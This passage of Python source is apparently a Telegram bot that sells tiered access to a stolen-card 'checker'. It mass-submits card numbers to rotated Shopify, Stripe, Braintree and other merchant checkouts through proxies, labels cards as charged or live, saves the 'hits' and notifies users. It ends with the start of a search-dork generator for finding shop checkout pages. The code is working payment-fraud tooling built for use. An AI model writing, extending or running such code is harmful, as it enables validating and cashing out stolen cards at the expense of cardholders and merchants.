            "<code>/aumc 4111111111111111|12|25|123 4222222222222222|11|24|456</code>\n\n"
            "Or reply to a .txt file with /aumc\n\n"
            "📍 <b>New API Features:</b>\n"
            "• Faster response times\n"
            "• Better proxy support\n"
            "• Automatic site rotation\n"
            "• Higher success rates",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not user_manager.can_access_gateway(user_id, 'autosopi'):
        await message.reply_text("❌ Your tier doesn't have access to Autosopi gateway.")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str[:30])
    
    if invalid_cards:
        await message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0]}..."
        )
    
    if not cards:
        await message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    # Check batch size limit
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    await autosopi_mass_check_logic(update, context, cards)


async def autosopi_single_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
    """Single card check logic with API-specific proxies and site rotation"""
    u_id = update.effective_user.id
    message = update.effective_message
    
    try:
        allowed, error_msg = await check_user_access(update, context, "autosopi")
        if not allowed:
            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
            return
        
        status_msg = await message.reply_text("🔄 Checking card with Autosopi...")
        
        # Site rotation with retry
        max_site_retries = 3
        site_retry_count = 0
        result = None
        site_used = None
        
        while site_retry_count < max_site_retries and not result:
            site = autosopi_site_manager.get_next_site_weighted()
            if not site:
                await status_msg.edit_text("❌ No sites available.")
                return
            
            # Check if site is dead (has 3+ failures)
            site_failures = autosopi_site_manager.site_failures.get(site, 0)
            if site_failures >= 3:
                print(f"⏭️ Skipping dead site: {site} (failures: {site_failures})")
                site_retry_count += 1
                continue
            
            await status_msg.edit_text(f"🔄 Trying site: {site}...")
            
            # Get working proxies from user's tested pool
            main_api_proxy = None
            teamoicx_proxy = None
            
            if user_manager.can_use_proxy(u_id):
                # Get any working proxy from tested pool (will try main format first)
                main_api_proxy = get_working_proxy_for_user(u_id, 'main')
                teamoicx_proxy = get_working_proxy_for_user(u_id, 'backup')
                
                if main_api_proxy:
                    print(f"🔵 Using working MAIN proxy: {mask_proxy(main_api_proxy)}")
                if teamoicx_proxy:
                    print(f"🟢 Using working BACKUP proxy: {mask_proxy(teamoicx_proxy)}")
            
            # Call API
            result = await fast_check_card(card, site, main_api_proxy, teamoicx_proxy, u_id, retry_count=0)
            
            # Check if result indicates site dead
            if result and result.get("success"):
                response_text = result.get("Response", "")
                if "SITE DEAD" in response_text:
                    print(f"💀 Site DEAD: {site}")
                    autosopi_site_manager.mark_site_result(site, False, is_site_dead=True)
                    result = None
                    site_retry_count += 1
                    await asyncio.sleep(0.5)
                    continue
                else:
                    # Success, mark as good
                    autosopi_site_manager.mark_site_result(site, True)
                    site_used = site
                    break
            else:
                site_retry_count += 1
                await asyncio.sleep(0.5)
        
        if not result:
            await status_msg.edit_text("❌ All sites failed or no working sites available.")
            return
        
        if not result.get("success"):
            await status_msg.edit_text(f"❌ Error: {result.get('error', 'Unknown')}")
            return
        
        # Process result (same as before)
        response_text = result.get("Response", "UNKNOWN")
        price = result.get("Price", "0.00")
        api_used = result.get("api_used", "main")
        
        try:
            price_float = float(price)
            price_str = f"${price_float:.2f}"
        except:
            price_str = price
        
        response_upper = response_text.upper()
        
        if any(x in response_upper for x in ["CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID"]):
            status_display = "🔥 CHARGED 🔥"
            category = "charged"
        elif any(x in response_upper for x in ["OTP", "3D", "SECURE", "AUTHENTICATION"]):
            status_display = "🔐 3D REQUIRED"
            category = "live"
        elif any(x in response_upper for x in ["INSUFFICIENT", "FUNDS"]):
            status_display = "💰 INSUFFICIENT FUNDS"
            category = "live"
        else:
            status_display = "❌ DECLINED"
            category = "declined"
        
        bin_info = await get_bin_info(card)
        bin_text, bank, country, _, _ = bin_info
        
        output = (
            f"┏━━━━━━━⍟\n"
            f"┃ {status_display}\n"
            f"┗━━━━━━━━━━━⊛\n\n"
            f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
            f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Autosopi\n"
            f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_text}\n"
            f"[⌬] 𝐏𝐫𝐢𝐜𝐞 ↣ {price_str}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[⌬] 𝐁𝐈𝐍 ↣ {bin_text}\n"
            f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
            f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        
        await status_msg.edit_text(output, parse_mode=ParseMode.HTML)
        
        if category in ["charged", "live"]:
            tier = user_manager.get_tier(u_id)
            await save_hit_to_file(
                card=card,
                gateway="Autosopi",
                response=response_text,
                price=price_str,
                bin_info=bin_info,
                user_id=u_id,
                user_tier=tier
            )
            
            user_data = user_manager.get_user(u_id)
            await send_hit_notification(
                context=context,
                gateway="Autosopi",
                card=card,
                response=response_text,
                price=price_str,
                user=user_data,
                bin_info=bin_info,
                status_category=category
            )
            
            user_manager.increment_hits(u_id)
        
        user_manager.increment_checks(u_id)
        
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [Autosopi Single] Error: {traceback.format_exc()}")
        
# ============ SEPARATE ERROR CATEGORIES ============

# Errors that should trigger a RETRY (try different site/proxy)
RETRY_ERRORS = [
    "SITE DEAD",           # Site is down, try another site
    "PROXY DEAD",          # Proxy failed, try another proxy  
    "CONNECTION ERROR",    # Network issue, retry
    "TIMEOUT",             # Timeout, retry
    "SERVER ERROR",        # Server error, retry
    "FAILED TO PERFORM",   # API error, retry
    "TOKENIZE_FAIL",       # Tokenization failed, retry
]

# Errors that should trigger SITE REMOVAL (only these)
SITE_REMOVAL_ERRORS = [
    "SUBMIT REJECTED",     # ONLY this error removes sites
]

# Errors that should NOT retry (card is dead)
NO_RETRY_ERRORS = [
    "CHARGED",
    "ORDER COMPLETED",
    "CARD_DECLINED",
    "INSUFFICIENT FUNDS",
    "CVV MISMATCH",
    "EXPIRED CARD",
    "DO NOT HONOR",
]
        
async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """ENHANCED Autosopi mass check with SMART PROXY TRACKING and 5 retries"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [ENHANCED AUTOSOPI MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"🔄 Max retries: {AUTOSOPI_RETRY_CONFIG['max_retries']}")
    print(f"🗑️ Sites removed ONLY for: SUBMIT REJECTED")
    print(f"🔌 Smart Proxy Tracking: ENABLED")
    print(f"✅ Only showing: CHARGED, 3D REQUIRED, INSUFFICIENT FUNDS, CVV LIVE")
    print(f"{'='*80}")
    
    # Reset retry manager for this session
    autosopi_retry_manager.reset()
    
    # Show proxy status at start
    working_proxies = autosopi_proxy_tracker.working_proxies.get(u_id, [])
    if working_proxies:
        print(f"🔌 Using {len(working_proxies)} working proxies from tracker")
        for i, p in enumerate(working_proxies[:5], 1):
            perf = autosopi_proxy_tracker.proxy_performance.get(p, {})
            success_rate = (perf.get('success_count', 0) / perf.get('total_checks', 1) * 100)
            print(f"   {i}. {mask_proxy(p)} - {success_rate:.0f}% success rate")
    else:
        print(f"⚠️ No working proxies in tracker, will use direct connection or fallback")
    
    try:
        autosopi_active_tasks[u_id] = True
        tier = user_manager.get_tier(u_id)
        
        # Concurrency based on tier (reduced for better proxy rotation)
        CONCURRENCY = {
            "free": 5,
            "premium": 8,
            "ultimate": 10,
            "admin": 15
        }.get(tier, 5)
        
        stats = {
            "charged": 0,
            "approved": 0,
            "otp": 0,
            "declined": 0,
            "errors": 0,
            "retries": 0,
            "sites_removed": 0,
            "proxies_used": 0,
            "total": total,
            "processed": 0
        }
        
        start_time = time.time()
        
        if progress_msg is None:
            working_count = len(autosopi_proxy_tracker.working_proxies.get(u_id, []))
            progress_msg = await message.reply_text(
                f"⚡ <b>Enhanced Autosopi Processing</b>\n\n"
                f"📝 Cards: {total}\n"
                f"🔄 Starting...",
                parse_mode=ParseMode.HTML,
                reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting...")
            )
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        results_lock = asyncio.Lock()
        processed_count = 0
        
        async def process_single_card(card: str, idx: int):
            """Process a single card with retry logic and smart proxy tracking"""
            nonlocal processed_count
            
            async with semaphore:
                retry_count = 0
                max_retries = AUTOSOPI_RETRY_CONFIG["max_retries"]
                result = None
                site_used = None
                last_proxy = None
                used_proxies = []  # Track proxies used for this card
                
                while retry_count <= max_retries:
                    # Get next site for this attempt
                    site = autosopi_site_manager.get_next_site_weighted()
                    if not site:
                        print(f"❌ No sites available for card {card[:20]}")
                        break
                    
                    # Check if site is dead (has 3+ failures)
                    site_failures = autosopi_site_manager.site_failures.get(site, 0)
                    if site_failures >= 3:
                        print(f"⏭️ Skipping dead site: {site} (failures: {site_failures})")
                        retry_count += 1
                        continue
                    
                    # ============ SMART PROXY SELECTION ============
                    proxy_str = None
                    if user_manager.can_use_proxy(u_id):
                        # Get working proxy from tracker, excluding the one that just failed
                        proxy_str = autosopi_proxy_tracker.get_working_proxy(u_id, exclude_proxy=last_proxy)
                        if proxy_str:
                            stats["proxies_used"] += 1
                            print(f"🔌 [Card {idx}] Using proxy from tracker: {mask_proxy(proxy_str)}")
                        else:
                            # Fallback to user's original proxies
                            if u_id in proxy_manager.user_proxies and proxy_manager.user_proxies[u_id]:
                                proxy_str = proxy_manager.user_proxies[u_id][0]
                                print(f"⚠️ [Card {idx}] No working proxy, falling back to: {mask_proxy(proxy_str)}")
                    
                    start = time.time()
                    result = await check_card_new_autosopi(card, site, proxy_str, u_id, retry_count)
                    elapsed = time.time() - start
                    
                    if not result:
                        retry_count += 1
                        if proxy_str:
                            used_proxies.append(proxy_str)
                            last_proxy = proxy_str
                        continue
                    
                    response_text = result.get("message", "")
                    response_upper = response_text.upper()
                    status_category = result.get("status_category", "unknown")
                    
                    # ============ RECORD PROXY RESULT FOR TRACKING ============
                    if proxy_str:
                        await autosopi_proxy_tracker.record_proxy_result(u_id, proxy_str, response_text, elapsed)
                        used_proxies.append(proxy_str)
                    
                    # ============ CHECK FOR SITE REMOVAL (SUBMIT REJECTED only) ============
                    if "SUBMIT REJECTED" in response_upper:
                        # Remove site immediately
                        autosopi_site_manager.remove_site(site, OWNER_ID)
                        stats["sites_removed"] += 1
                        print(f"🗑️ Site REMOVED: {site} (SUBMIT REJECTED)")
                        
                        # Still retry the card with a different site
                        retry_count += 1
                        if retry_count <= max_retries:
                            delay = autosopi_retry_manager.retry_delays[min(retry_count - 1, len(autosopi_retry_manager.retry_delays) - 1)]
                            print(f"🔄 Retry #{retry_count}/{max_retries} for card {card[:20]}... waiting {delay}s")
                            last_proxy = proxy_str
                            await asyncio.sleep(delay)
                            continue
                        else:
                            break
                    
                    # ============ CHECK FOR RETRY (without site removal) ============
                    retryable_errors = [
                        "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR",
                        "TIMEOUT", "SERVER ERROR", "FAILED TO PERFORM", "TOKENIZE_FAIL",
                        "EMPTY_RESPONSE", "CONNECTION_FAILED", "JSON_ERROR",
                        "NO_SESSION_TOKEN", "CURL_ERROR", "ALL SITES DEAD"
                    ]
                    
                    needs_retry = any(err in response_upper for err in retryable_errors)
                    
                    # Also retry if status is error and not a card error
                    if status_category == "error" and not needs_retry:
                        # Check if it's a card error vs connection error
                        card_errors = ["CARD_DECLINED", "INVALID CARD", "EXPIRED"]
                        if not any(err in response_upper for err in card_errors):
                            needs_retry = True
                    
                    if needs_retry and retry_count < max_retries:
                        retry_count += 1
                        delay = autosopi_retry_manager.retry_delays[min(retry_count - 1, len(autosopi_retry_manager.retry_delays) - 1)]
                        print(f"🔄 Retry #{retry_count}/{max_retries} for card {card[:20]}... waiting {delay}s")
                        print(f"   Reason: {response_text[:50]}")
                        last_proxy = proxy_str
                        await asyncio.sleep(delay)
                        continue
                    
                    # ============ BREAK OUT OF RETRY LOOP ============
                    # Success or non-retryable - break out
                    break
                
                # Update processed count and progress
                async with results_lock:
                    processed_count += 1
                    
                    # Update progress every 5 cards or at completion
                    if processed_count % 5 == 0 or processed_count == total:
                        working_count = len(autosopi_proxy_tracker.working_proxies.get(u_id, []))
                        success_total = stats["charged"] + stats["otp"] + stats["approved"]
                        
                        await update_progress_buttons(
                            context, message.chat_id, progress_msg.message_id,
                            processed_count, total,
                            success_total,
                            stats["declined"],
                            f"{processed_count}/{total}",
                            f"Proxies: {working_count} | Retries: {retry_count}"
                        )
                
                if retry_count > 0:
                    async with results_lock:
                        stats["retries"] += retry_count
                
                return idx, result, card, site_used, elapsed, retry_count, used_proxies
            
            # End of process_single_card
        
        # Process all cards with concurrency control
        tasks = [process_single_card(card, i) for i, card in enumerate(cards, 1)]
        
        for completed_task in asyncio.as_completed(tasks):
            if u_id not in autosopi_active_tasks:
                break
            
            try:
                idx, result, card, site, elapsed, retry_count, used_proxies = await completed_task
                
                if not result:
                    async with results_lock:
                        stats["errors"] += 1
                    continue
                
                # ============ FIXED: ONLY THESE 4 STATUSES ARE POSITIVE ============
                # CHARGED, 3D/OTP REQUIRED, INSUFFICIENT FUNDS, CVV LIVE
                
                response_text = result.get("message", "UNKNOWN")
                gateway_from_response = result.get("gateway", "Shopify Payments")
                price = result.get("price", "0.00")
                response_upper = response_text.upper()
                
                # Check for the 4 positive statuses
                is_charged = any(x in response_upper for x in ["CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID", "COMPLETED"])
                is_3d = any(x in response_upper for x in ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS", "THREEDS"])
                is_insufficient = any(x in response_upper for x in ["INSUFFICIENT", "FUNDS", "INSUFFICIENT_FUNDS"])
                is_cvv_live = any(x in response_upper for x in ["CVV LIVE", "INCORRECT_CVV", "CVV_MISMATCH"])
                
                # Check if it's a positive status (one of the 4)
                is_positive = is_charged or is_3d or is_insufficient or is_cvv_live
                
                # Update stats based on actual response
                async with results_lock:
                    if is_charged:
                        stats["charged"] += 1
                        print(f"🔥 CHARGED! Card: {card[:20]}... Response: {response_text[:50]}")
                    elif is_3d:
                        stats["otp"] += 1
                        print(f"🔐 3D/OTP REQUIRED: {card[:20]}...")
                    elif is_insufficient:
                        stats["approved"] += 1
                        print(f"💰 INSUFFICIENT FUNDS: {card[:20]}...")
                    elif is_cvv_live:
                        stats["approved"] += 1
                        print(f"✅ CVV LIVE: {card[:20]}...")
                    else:
                        # ANYTHING ELSE IS DECLINED (even after retries)
                        stats["declined"] += 1
                        print(f"❌ DECLINED: {card[:20]}... - {response_text[:50]}")
                
                # Send result ONLY for positive statuses (charged, 3d, insufficient, cvv live)
                if is_positive:
                    bin_info = await get_bin_info(card)
                    bin_text, bank, country, _, _ = bin_info
                    
                    try:
                        price_float = float(price)
                        price_str = f"${price_float:.2f}"
                    except:
                        price_str = price
                    
                    # Determine display status
                    if is_charged:
                        status_display = "🔥 CHARGED 🔥"
                    elif is_3d:
                        status_display = "🔐 3D REQUIRED"
                    elif is_insufficient:
                        status_display = "💰 INSUFFICIENT FUNDS"
                    else:
                        status_display = "✅ CVV LIVE"
                    
                    output = (
                        f"┏━━━━━━━⍟\n"
                        f"┃ {status_display}\n"
                        f"┗━━━━━━━━━━━⊛\n\n"
                        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
                        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway_from_response}\n"
                        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_text}\n"
                        f"[⌬] 𝐏𝐫𝐢𝐜𝐞 ↣ {price_str}\n"
                        f"━━━━━━━━━━━━━━━━━━━\n"
                        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_text}\n"
                        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
                        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
                        f"━━━━━━━━━━━━━━━━━━━"
                    )
                    
                    
                    try:
                        await message.reply_text(output, parse_mode=ParseMode.HTML)
                    except Exception as e:
                        print(f"❌ Error sending message: {e}")
                    
                    # Save hit to file for all positive results
                    await save_hit_to_file(
                        card=card,
                        gateway=gateway_from_response,
                        response=response_text,
                        price=price_str,
                        bin_info=bin_info,
                        user_id=u_id,
                        user_tier=tier
                    )
                    
                    # Send notification ONLY for charged cards
                    if is_charged:
                        user_data = user_manager.get_user(u_id)
                        await send_gif_with_result_combined(
                            update=update,
                            context=context,
                            card=card,
                            gateway="autoshopify",
                            response=response_text,
                            price=price_str,
                            user=user_data,
                            bin_info=bin_info,
                            status_category="charged"
                        )
                    
                    user_manager.increment_hits(u_id)
                
                user_manager.increment_checks(u_id, 1)
                
            except Exception as e:
                print(f"❌ Task error: {e}")
                print(f"📝 Traceback: {traceback.format_exc()}")
                async with results_lock:
                    stats["errors"] += 1
        
        # Final summary
        if u_id in autosopi_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            success_total = stats["charged"] + stats["otp"] + stats["approved"]
            success_rate = (success_total / total * 100) if total > 0 else 0
            cards_per_minute = (total / (total_time / 60)) if total_time > 0 else 0
            
            working_proxies_count = len(autosopi_proxy_tracker.working_proxies.get(u_id, []))
            
            summary = (
                f"🏁 <b>Autosopi Session Complete</b>\n\n"
                f"🔥 Charged: {stats['charged']}\n"
                f"🔐 3D/OTP: {stats['otp']}\n"
                f"✅ CVV Live/Insufficient: {stats['approved']}\n"
                f"❌ Declined: {stats['declined']}\n"
                f"⚠️ Errors: {stats['errors']}\n"
                f"⏱️ Time: {minutes}m {seconds}s"
            )
            
            await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        
        return stats
        
    except Exception as e:
        print(f"❌ Enhanced mass check error: {e}")
        print(f"📝 Traceback: {traceback.format_exc()}")
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            else:
                await message.reply_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        autosopi_active_tasks.pop(u_id, None)
        print(f"🏁 [Autosopi] Session ended for user {u_id}")


# Add shutdown handler
async def shutdown_autosopi():
    """Cleanup function for Autosopi"""
    await close_autosopi_client()
    
def convert_to_main_api_format(proxy: str) -> Optional[str]:
    """
    Convert any proxy to MAIN API format (host:port:user:pass)
    The API expects format: host:port:user:pass
    Based on example: 31.193.191.114:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382
    """
    if not proxy:
        return None
    
    try:
        # Remove any protocol prefixes (http://, https://, socks5://, etc.)
        proxy = re.sub(r'^(http|https|socks4|socks5)://', '', proxy)
        
        # Handle different input formats
        
        # Format 1: user:pass@host:port
        if '@' in proxy:
            auth, hostport = proxy.split('@', 1)
            if ':' in auth:
                user, password = auth.split(':', 1)
                if ':' in hostport:
                    host, port = hostport.split(':', 1)
                    # Return in API's expected format: host:port:user:pass
                    result = f"{host}:{port}:{user}:{password}"
                    print(f"🔍 Converted @ format to: {result}")
                    return result
        
        # Format 2: host:port:user:pass (already in correct format)
        parts = proxy.split(':')
        if len(parts) == 4:
            # Validate that the port (second part) is numeric
            if parts[1].isdigit():
                # Check if first part looks like host (contains dots or letters)
                if '.' in parts[0] or not parts[0].isdigit():
                    print(f"🔍 Already in correct format: {proxy}")
                    return proxy  # Already in correct format
        
        # Format 3: user:pass:host:port
        if len(parts) == 4:
            # Check if the third part looks like a host (contains dots or letters)
            user, password, host, port = parts
            if ('.' in host or not host.isdigit()) and port.isdigit():
                result = f"{host}:{port}:{user}:{password}"
                print(f"🔍 Converted user:pass:host:port to: {result}")
                return result
        
        # Format 4: host:port only
        if len(parts) == 2 and parts[1].isdigit():
            # Can't return without auth if API requires it
            print(f"⚠️ Proxy without auth for API that requires it: {proxy}")
            return None
        
        # If we get here, format is unrecognized
        print(f"⚠️ Unrecognized proxy format for MAIN API: {proxy}")
        return None
        
    except Exception as e:
        print(f"⚠️ Error converting proxy format: {e}")
        return None

# ============ BRAINTREE SESSION CLEANUP FUNCTION ============
async def close_braintree_session():
    """Close Braintree session properly"""
    if 'braintree_session' in globals():
        await braintree_session.close()
        print("🔌 Braintree session closed")

# --- PROXY HANDLERS ---
async def test_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    working = []
    failed = []
    
    test_limit = min(10, len(proxy_list))
    
    for i, proxy_str in enumerate(proxy_list[:test_limit], 1):
        try:
            proxy_url = format_proxy(proxy_str)
            if proxy_url:
                async with httpx.AsyncClient(timeout=10) as client:
                    response = await client.get('http://httpbin.org/ip', proxies={'http': proxy_url, 'https': proxy_url})
                    if response.status_code == 200:
                        working.append(proxy_str)
                        proxy_manager.mark_proxy_success(proxy_str)
                    else:
                        failed.append(proxy_str)
                        proxy_manager.mark_proxy_failure(proxy_str)
            else:
                failed.append(proxy_str)
                proxy_manager.mark_proxy_failure(proxy_str)
        except:
            failed.append(proxy_str)
            proxy_manager.mark_proxy_failure(proxy_str)
    
    if working:
        proxy_list[:] = working
        proxy_manager.save_proxies()
    
    result = f"🧪 <b>Proxy Test Complete</b>\n\n✅ Working: {len(working)}\n❌ Failed: {len(failed)}"
    await query.edit_message_text(result, parse_mode=ParseMode.HTML, reply_markup=back_menu())

# --- UI FUNCTIONS ---
def main_menu():
    """Main menu without PayPal as default"""
    keyboard = [
        [
            InlineKeyboardButton("📁 Check File", callback_data='h_file'),
            InlineKeyboardButton("💳 Check Text", callback_data='h_text')
        ],
        [
            InlineKeyboardButton("💰 Set Amount", callback_data='set_amount'),
            InlineKeyboardButton("📊 My Stats", callback_data='my_stats')
        ],
        [
            InlineKeyboardButton("🔄 Proxy Manager", callback_data='proxy_menu'),
            InlineKeyboardButton("🌐 Select Gateway", callback_data='gateway_menu')  # Changed from direct PayPal
        ],
        [
            InlineKeyboardButton("👨‍💻 Developer", url='https://t.me/unruly_yut')
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def gateway_menu():
    keyboard = [
        [
            InlineKeyboardButton("💳 PayPal", callback_data='gateway_paypal'),
            InlineKeyboardButton("🛍️ Shopify", callback_data='gateway_shopify')
        ],
        [
            InlineKeyboardButton("💰 Razorpay", callback_data='gateway_razorpay'),
            InlineKeyboardButton("💳 Stripe Charge", callback_data='gateway_stripe_charge')
        ],
        [
            InlineKeyboardButton("💳 Stripe Auth", callback_data='gateway_stripe_auth'),
            InlineKeyboardButton("🔷 Braintree", callback_data='gateway_braintree')
        ],
        [
            InlineKeyboardButton("🤖 Autosopi", callback_data='gateway_autosopi'),
            InlineKeyboardButton("💸 Payflow", callback_data='gateway_payflow')
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data='back_main')
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def autosopi_menu():
    keyboard = [
        [
            InlineKeyboardButton("📋 List Sites", callback_data='autosopi_list'),
            InlineKeyboardButton("📊 Site Stats", callback_data='autosopi_stats')
        ],
        [
            InlineKeyboardButton("📤 Submit Site", callback_data='autosopi_submit'),
            InlineKeyboardButton("🔄 Reset Rotation", callback_data='autosopi_rotate')
        ],
        [
            InlineKeyboardButton("🧪 Test Site", callback_data='autosopi_test'),
            InlineKeyboardButton("🧪 Test All Sites", callback_data='autosopi_test_all')
        ],
        [
            InlineKeyboardButton("⏳ Pending (Admin)", callback_data='autosopi_pending'),
            InlineKeyboardButton("➕ Add Site (Admin)", callback_data='autosopi_add')
        ],
        [
            InlineKeyboardButton("❌ Remove Site (Admin)", callback_data='autosopi_remove'),
            InlineKeyboardButton("🔙 Back to Gateways", callback_data='gateway_menu')
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def razorpay_menu():
    keyboard = [
        [
            InlineKeyboardButton("💰 Set INR Amount", callback_data='razorpay_amount'),
            InlineKeyboardButton("🌐 Set Site", callback_data='razorpay_site')
        ],
        [
            InlineKeyboardButton("🔙 Back to Gateways", callback_data='gateway_menu')
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def proxy_menu_markup():
    """Proxy menu with global and user options"""
    keyboard = [
        [
            InlineKeyboardButton("🌐 Global Proxies", callback_data='global_proxy_menu'),
            InlineKeyboardButton("👤 My Proxies", callback_data='myproxy_menu')
        ],
        [
            InlineKeyboardButton("📊 Global Stats", callback_data='proxy_stats'),
            InlineKeyboardButton("📊 My Stats", callback_data='mystats')
        ],
        [
            InlineKeyboardButton("🔙 Main Menu", callback_data='back_main')
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def my_proxy_menu():
    """User's personal proxy menu"""
    keyboard = [
        [
            InlineKeyboardButton("📋 List My Proxies", callback_data='mylist'),
            InlineKeyboardButton("➕ Add Proxy", callback_data='myadd')
        ],
        [
            InlineKeyboardButton("❌ Remove Proxy", callback_data='myremove'),
            InlineKeyboardButton("🧪 Test My Proxies", callback_data='mytest')
        ],
        [
            InlineKeyboardButton("🗑️ Clear All", callback_data='myclear'),
            InlineKeyboardButton("📊 My Stats", callback_data='mystats')
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data='proxy_menu')
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def stop_markup(u_id):
    keyboard = [
        [InlineKeyboardButton("🛑 STOP SESSION", callback_data=f'stop_{u_id}')]
    ]
    return InlineKeyboardMarkup(keyboard)

def amount_menu():
    keyboard = [
        [
            InlineKeyboardButton("$0.50", callback_data='amount_0.50'),
            InlineKeyboardButton("$1.00", callback_data='amount_1.00'),
            InlineKeyboardButton("$5.00", callback_data='amount_5.00')
        ],
        [
            InlineKeyboardButton("$10.00", callback_data='amount_10.00'),
            InlineKeyboardButton("$25.00", callback_data='amount_25.00'),
            InlineKeyboardButton("$50.00", callback_data='amount_50.00')
        ],
        [
            InlineKeyboardButton("$100.00", callback_data='amount_100.00'),
            InlineKeyboardButton("🎯 Custom", callback_data='amount_custom')
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data='back_main')
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def start_menu():
    """Create the start menu with the buttons shown in the image"""
    keyboard = [
        [
            InlineKeyboardButton("Gates", callback_data='gateway_menu'),
            InlineKeyboardButton("Pricing", callback_data='price_menu')
        ],
        [
            InlineKeyboardButton("Group", url=REQUIRED_GROUP_LINK),
            InlineKeyboardButton("Updates", url='https://t.me/+QeNrb5W8eJQyY2E1')  # Add your channel
        ],
        [
            InlineKeyboardButton("Dev", url='https://t.me/+QeNrb5W8eJQyY2E1'),
            InlineKeyboardButton("Support", url='https://t.me/+QeNrb5W8eJQyY2E1')  # Add support link
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def back_menu():
    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

# ============ SMART DORK FEATURE ============

import aiohttp
from bs4 import BeautifulSoup
import urllib.parse
import random
import re
from typing import List, Dict, Tuple
import json

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0'
]

SHOPPING_INTENT_KEYWORDS = [
    'buy', 'shop', 'store', 'purchase', 'order', 'online',
    'price', 'deal', 'discount', 'sale', 'cheap', 'best price'
]

SHOPPING_DORK_TEMPLATES = [
    'intitle:"{keyword}" "add to cart"',
    'intitle:"{keyword}" "buy now"',
    'intitle:"{keyword}" "checkout"',
    'inurl:products "{keyword}"',
    'inurl:collections "{keyword}"',
    'inurl:shop "{keyword}"',
    '"{keyword}" "shopping cart"',
